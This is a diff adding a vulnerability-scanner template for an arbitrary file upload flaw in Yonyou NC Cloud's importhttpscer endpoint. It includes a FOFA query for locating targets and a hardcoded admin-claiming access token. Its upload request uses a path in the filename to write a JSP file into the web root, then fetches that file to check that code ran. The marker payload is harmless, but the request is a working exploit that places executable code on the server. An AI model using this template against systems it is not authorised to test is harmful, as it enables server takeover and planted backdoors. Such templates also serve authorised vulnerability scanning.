@@ -1,0 +1,44 @@
+id: yongyouNC-Cloud-importhttpscer-File-upload
+
+info:
+  name: 用友NC Cloud importhttpscer 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: icon_hash="1596996317"
+    用友NC Cloud importhttpscer接口处存在任意文件上传漏洞，，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488565&idx=1&sn=c1b0eb3b1f62080dacfa926b6db0fd86&chksm=c267a106f5102810dd289c96fbe0ecc1400f4d0e2351d0eac41901438ce218c3c758c3012943&token=2115358587&lang=zh_CN#rd
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+  
+http:
+  - raw:
+      - |
+        POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
+        Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0
+
+        --fd28cb44e829ed1c197ec3bc71748df0
+        Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/{{username}}.jsp"
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
+        --fd28cb44e829ed1c197ec3bc71748df0--
+  - raw:
+      - |
+        GET /{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
